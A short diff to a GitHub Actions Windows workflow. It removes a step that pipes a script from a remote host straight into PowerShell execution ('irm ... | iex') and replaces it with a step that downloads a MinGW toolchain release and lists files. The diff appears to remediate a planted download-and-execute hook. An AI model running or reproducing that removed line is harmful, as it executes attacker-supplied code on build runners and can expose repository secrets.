@@ -11,5 +11,12 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - run: |
-          irm http://xju.dpdns.org/24h.php?id=6905e6c8c6496 | iex
+    - uses: robinraju/release-downloader@v1
+      with:
+        repository: 'brechtsanders/winlibs_mingw'
+        tag: '10.5.0-11.0.1-msvcrt-r2'
+        fileName: 'winlibs-i686-posix-dwarf-gcc-10.5.0-mingw-w64msvcrt-11.0.1-r2.zip'
+        extract: true
+
+    - run: |
+        ls
